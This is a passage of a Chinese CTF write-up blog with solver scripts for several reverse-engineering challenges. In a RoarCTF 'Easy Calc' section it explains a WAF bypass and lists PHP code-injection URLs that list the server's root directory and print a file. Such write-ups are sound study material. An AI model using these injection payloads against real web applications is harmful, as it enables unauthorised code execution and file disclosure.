class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,((<span class="keyword">uint32_t</span>)target[i])&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出了Bingo!啊，为啥不对呢</p>
<p>看了答案，由于最后两位是未知的，并且缺少md5，所以错误。最后一位可以猜测出是\x02，倒数第二位真的需要md5了</p>
<h2 id="rev-watevrCTF-2019-Repyc"><a href="#rev-watevrCTF-2019-Repyc" class="headerlink" title="[rev][watevrCTF 2019]Repyc"></a>[rev][watevrCTF 2019]Repyc</h2><p>在线pyc反编译，然后打开发现是复杂的变量名</p>
<p>分析虚拟机架构，重命名各个变量</p>
<p>得到总流程，可是最后结果出不来，看答案说是编码问题。所以为啥先用utf-8编码再处理就可以了呢。<del>然后尝试了utf-8编码再utf-8解码，得到的数值就不一样了</del></p>
<p>后续补充：python中编码即把类型变成str，一个单位是一个数，这个数代表要显示的字符，大概可以看成一个编号；解码就是这个字符对应的字节序列</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="string">b&#x27;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&#x27;</span></span><br><span class="line">a=[]</span><br><span class="line">f = str(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(bytes(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(f)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    a.append((ord(i)+<span class="number">15</span>)^<span class="number">135</span>)</span><br><span class="line">print()</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

<p>watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0}</p>
<h2 id="rev-GXYCTF2019-minecraft"><a href="#rev-GXYCTF2019-minecraft" class="headerlink" title="[rev][GXYCTF2019]minecraft"></a>[rev][GXYCTF2019]minecraft</h2><ol>
<li>先判断长度为&gt;5 &lt;33</li>
<li>base64编码</li>
<li>爆破(没想到爆破速度这么快)</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">len(data)=3</span></span><br><span class="line"><span class="comment">len(r)=4*/</span></span><br><span class="line"><span class="keyword">int8_t</span> base64Tab[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base64</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint8_t</span> *r)</span></span>&#123;</span><br><span class="line">    r[<span class="number">0</span>]=(data[<span class="number">0</span>]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3f</span>;</span><br><span class="line">    r[<span class="number">1</span>]=((data[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0x30</span>)|((data[<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>);</span><br><span class="line">    r[<span class="number">2</span>]=((data[<span class="number">1</span>]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0x3c</span>)|((data[<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0x3</span>);</span><br><span class="line">    r[<span class="number">3</span>]=(data[<span class="number">2</span>]&amp;<span class="number">0x3f</span>);</span><br><span class="line">    r[<span class="number">0</span>] = base64Tab[r[<span class="number">0</span>]];</span><br><span class="line">    r[<span class="number">1</span>] = base64Tab[r[<span class="number">1</span>]];</span><br><span class="line">    r[<span class="number">2</span>] = base64Tab[r[<span class="number">2</span>]];</span><br><span class="line">    r[<span class="number">3</span>] = base64Tab[r[<span class="number">3</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">cal</span><span class="params">(<span class="keyword">uint64_t</span> x,<span class="keyword">uint8_t</span> y)</span></span>&#123;</span><br><span class="line">    x ^= <span class="number">0xC6A4A7935BD1E995</span>ull * (((<span class="number">0xC6A4A7935BD1E995</span>ull * y) &gt;&gt; <span class="number">47</span>) ^ <span class="number">0xC6A4A7935BD1E995</span>ull * y);</span><br><span class="line">    x *= <span class="number">0xC6A4A7935BD1E995</span>ull;</span><br><span class="line">    x += <span class="number">0xE6546B64</span>ull;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tab[]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;_+/&quot;</span>;</span><br><span class="line">    <span class="keyword">size_t</span> tabLen = <span class="built_in">strlen</span>(tab);</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> r[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> x,y;</span><br><span class="line">    <span class="keyword">uint64_t</span> target[<span class="number">8</span>];</span><br><span class="line">    target[<span class="number">0</span>] = <span class="number">0x6C43B2A7</span>ull;</span><br><span class="line">    target[<span class="number">1</span>] = <span class="number">0x7954FD91</span>ull;</span><br><span class="line">    target[<span class="number">2</span>] = <span class="number">0xA3E9532</span>ull;</span><br><span class="line">    target[<span class="number">3</span>] = <span class="number">0xB87B5156</span>ull;</span><br><span class="line">    target[<span class="number">4</span>] = <span class="number">0xDA847742</span>;</span><br><span class="line">    target[<span class="number">5</span>] = <span class="number">0x2395E7F3</span>;</span><br><span class="line">    target[<span class="number">6</span>] = <span class="number">0xA679D954</span>;</span><br><span class="line">    target[<span class="number">7</span>] = <span class="number">0xE1FAAFF7</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i1=<span class="number">0</span>;i1&lt;tabLen;i1++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> i2=<span class="number">0</span>;i2&lt;tabLen;i2++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">size_t</span> i3=<span class="number">0</span>;i3&lt;tabLen;i3++)&#123;</span><br><span class="line">                    flag[<span class="number">0</span>]=tab[i1];</span><br><span class="line">                    flag[<span class="number">1</span>]=tab[i2];</span><br><span class="line">                    flag[<span class="number">2</span>]=tab[i3];</span><br><span class="line">                    base64(flag,r);</span><br><span class="line">                    x=<span class="number">0</span>;</span><br><span class="line">                    x=cal(x,r[<span class="number">0</span>]);</span><br><span class="line">                    x=cal(x,r[<span class="number">1</span>]);</span><br><span class="line">                    x=cal(x,r[<span class="number">2</span>]);</span><br><span class="line">                    x=cal(x,r[<span class="number">3</span>]);</span><br><span class="line">                    x&amp;=<span class="number">0xffffffff</span>ull;</span><br><span class="line">                    <span class="keyword">if</span>(x==target[i])&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    brute();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后要推测，加d}</p>
<h2 id="rev-WMCTF2020-easy-re"><a href="#rev-WMCTF2020-easy-re" class="headerlink" title="[rev][WMCTF2020]easy_re"></a>[rev][WMCTF2020]easy_re</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-317216-1-1.html">https://www.52pojie.cn/thread-317216-1-1.html</a></p>
<p>跟进程序第一步的那个内存，然后单步往下调试，就可以看到反汇编窗口注释处各种字符串，直接复制就是脚本了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eax:&quot;$flag &#x3D; \&quot;WMCTF&#123;&#123;I_WAnt_dynam1c_F1ag&#125;&#125;\&quot;;\r\nprint \&quot;please input the flag:\&quot;;\r\n$line &#x3D; &lt;STDIN&gt;;\r\nchomp($line);\r\nif($line eq $flag)&#123;&#123;\r\n\tprint \&quot;congratulation!\&quot;\r\n&#125;&#125;else&#123;&#123;\r\n\tprint \&quot;no,wrong\&quot;\r\n&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="web-RoarCTF-2019-Easy-Calc"><a href="#web-RoarCTF-2019-Easy-Calc" class="headerlink" title="[web][RoarCTF 2019]Easy Calc"></a>[web][RoarCTF 2019]Easy Calc</h2><p>原来可以访问calc源码啊</p>
<ol>
<li>如果WAF中有个规则是num不是表达式就拦截，WAF解析链接的时候会把空格和某些字符转为下划线，所以WAF看到的%20num参数会解析成_num，但是PHP解析时候会将空格去掉，这样就绕过WAF了</li>
<li>黑名单中有单引号和双引号过滤，所以要用chr()代替字符</li>
</ol>
<p>calc.php?%20num=phpinfo()</p>
<p>calc.php?%20num=var_dump(scandir(chr(47))) // 扫描根目录</p>
<p>有个f1agg</p>
<p>calc.php?%20num=show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) // 获取文件内容，使用file_get_contents也行</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/borber/p/Easy_Calc_1.html">https://www.cnblogs.com/borber/p/Easy_Calc_1.html</a></p>
<h2 id="rev-FlareOn5-FLEGGO"><a href="#rev-FlareOn5-FLEGGO" class="headerlink" title="[rev][FlareOn5]FLEGGO"></a>[rev][FlareOn5]FLEGGO</h2><p>一大帮exe文件</p>
<p>1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe</p>
<p>ZImIT7DyCMOeF6 651174.png =&gt; w</p>
<p>这个输出很奇怪</p>
<p>使用ResourceHacker发现所有的文件，密码都在指定的偏移处，可以直接执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">fs = os.listdir(<span class="string">&quot;fleggo&quot;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> fs:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.exe&quot;</span> <span class="keyword">in</span> f:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;\&quot;%s\&quot;,&quot;</span>%f,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;\n%d&quot;</span>%i)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> fnames[][<span class="number">256</span>]=&#123;<span class="string">&quot;1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe&quot;</span>,<span class="string">&quot;1JpPaUMynR9GflWbxfYvZviqiCB59RcI.exe&quot;</span>,<span class="string">&quot;2AljFfLleprkThTHuVvg63I7OgjG2LQT.exe&quot;</span>,<span class="string">&quot;3Jh0ELkck1MuRvzr8PLIpBNUGlspmGnu.exe&quot;</span>,<span class="string">&quot;4ihY3RWK4WYqI4XOXLtAH6XV5lkoIdgv.exe&quot;</span>,<span class="string">&quot;7mCysSKfiHJ4WqH2T8ERLE33Wrbp6Mqe.exe&quot;</span>,<span class="string">&quot;AEVYfSTJwubrlJKgxV8RAl0AdZJ5vhhy.exe&quot;</span>,<span class="string">&quot;aSfSVMn7B8eRtxgJgwPP5Y5HiDEidvKg.exe&quot;</span>,<span class="string">&quot;azcyERV8HUbXmqPTEq5JFt7Ax1W5K4wl.exe&quot;</span>,<span class="string">&quot;BG3IDbHOUt9yHumPceLTVbObBHFneYEu.exe&quot;</span>,<span class="string">&quot;Bl0Iv5lT6wkpVCuy7jtcva7qka8WtLYY.exe&quot;</span>,<span class="string">&quot;bmYBZTBJlaFNbbwpiOiiQVdzimx8QVTI.exe&quot;</span>,<span class="string">&quot;Bp7836noYu71VAWc27sUdfaGwieALfc2.exe&quot;</span>,<span class="string">&quot;cWvFLbliUfJl7KFDUYF1ABBFYFb6FJMz.exe&quot;</span>,<span class="string">&quot;d4NlRo5umkvWhZ2FmEG32rXBNeSSLt2Q.exe&quot;</span>,<span class="string">&quot;dnAciAGVdlovQFSJmNiPOdHjkM3Ji18o.exe&quot;</span>,<span class="string">&quot;dT4Xze8paLOG7srCdGLsbLE1s6m3EsfX.exe&quot;</span>,<span class="string">&quot;E36RGTbCE4LDtyLi97l9lSFoR7xVMKGN.exe&quot;</span>,<span class="string">&quot;eEJhUoNbuc40kLHRo8GB7bwFPkuhgaVN.exe&quot;</span>,<span class="string">&quot;eovBHrlDb809jf08yaAcSzcX4T37F1NI.exe&quot;</span>,<span class="string">&quot;Ew93SSPDbgiQYo4E4035A16MJUxXegDW.exe&quot;</span>,<span class="string">&quot;gFZw7lPUlbOXBvHRc31HJI5PKwy745Wv.exe&quot;</span>,<span class="string">&quot;hajfdokqjogmoWfpyp4w0feoeyhs1QLo.exe&quot;</span>,<span class="string">&quot;HDHugJBqTJqKKVtqi3sfR4BTq6P5XLZY.exe&quot;</span>,<span class="string">&quot;iJO15JsCa1bV5anXnZ9dTC9iWbEDmdtf.exe&quot;</span>,<span class="string">&quot;IXITujCLucnD4P3YrXOud5gC7Bwcw6mr.exe&quot;</span>,<span class="string">&quot;JIdE7SESzC1aS58Wwe5j3i6XbpkCa3S6.exe&quot;</span>,<span class="string">&quot;jJHgJjbyeWTTyQqISuJMpEGgE1aFs5ZB.exe&quot;</span>,<span class="string">&quot;JXADoHafRHDyHmcTUjEBOvqq95spU7sj.exe&quot;</span>,<span class="string">&quot;K7HjR3Hf10SGG7rgke9WrRfxqhaGixS0.exe&quot;</span>,<span class="string">&quot;kGQY35HJ7gvXzDJLWe8mabs3oKpwCo6L.exe&quot;</span>,<span class="string">&quot;lk0SOpnVIzTcC1Dcou9R7prKAC3laX0k.exe&quot;</span>,<span class="string">&quot;MrA1JmEDfPhnTi5MNMhqVS8aaTKdxbMe.exe&quot;</span>,<span class="string">&quot;NaobGsJ2w6qqblcIsj4QYNIBQhg3gmTR.exe&quot;</span>,<span class="string">&quot;P2PxxSJpnquBQ3xCvLoYj4pD3iyQcaKj.exe&quot;</span>,<span class="string">&quot;PvlqINbYjAY1E4WFfc2N6rZ2nKVhNZTP.exe&quot;</span>,<span class="string">&quot;SDIADRKhATsagJ3K8WwaNcQ52708TyRo.exe&quot;</span>,<span class="string">&quot;SeDdxvPJFHCr7uoQMjwmdRBAYEelHBZB.exe&quot;</span>,<span class="string">&quot;u3PL12jk5jCZKiVm0omvh46yK7NDfZLT.exe&quot;</span>,<span class="string">&quot;u8mbI3GZ8WtwruEiFkIl0UKxJS917407.exe&quot;</span>,<span class="string">&quot;v6RkHsLya4wTAh71C65hMXBsTc1ZhGZT.exe&quot;</span>,<span class="string">&quot;w3Y5YeglxqIWstp1PLbFoHvrQ9rN3F3x.exe&quot;</span>,<span class="string">&quot;wmkeAU8MdYrC9tEUMHH2tRMgaGdiFnga.exe&quot;</span>,<span class="string">&quot;x4neMBrqkYIQxDuXpwJNQZOlfyfA0eXs.exe&quot;</span>,<span class="string">&quot;xatgydl5cadiWFY4EXMRuoQr22ZIRC1Y.exe&quot;</span>,<span class="string">&quot;xyjJcvGAgswB7Yno5e9qLF4i13L1iGoT.exe&quot;</span>,<span class="string">&quot;y77GmQGdwVL7Fc9mMdiLJMgFQ8rgeSrl.exe&quot;</span>,<span class="string">&quot;zRx3bsMfOwG8IaayOeS8rHSSpiRfc9IB.exe&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> prefix[]=<span class="string">&quot;fleggo/&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> nLen=<span class="number">48</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> _i=<span class="number">0</span>;_i&lt;nLen;_i++)&#123;</span><br><span class="line">        <span class="keyword">char</span> fullname[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">char</span> password[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(fullname,<span class="string">&quot;%s%s&quot;</span>,prefix,fnames[_i]);</span><br><span class="line">        FILE *f = fopen(fullname,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fseek(f,<span class="number">0x2ab0</span>,SEEK_SET);</span><br><span class="line">        fread(password,<span class="number">32</span>,<span class="number">1</span>,f);</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">            password[i]=password[i*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s==&gt;%s\n&quot;</span>,fnames[_i],password);</span><br><span class="line">        FILE *pf = popen(fullname,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(pf,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        pclose(pf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    brute();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后手动排序</p>
<h2 id="DASCTF-安恒7月赛-alphabeta"><a href="#DASCTF-安恒7月赛-alphabeta" class="headerlink" title="[DASCTF]安恒7月赛 alphabeta"></a>[DASCTF]安恒7月赛 alphabeta</h2><p>这道题竟然可以用z3，我还以为直接穷举，学到了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 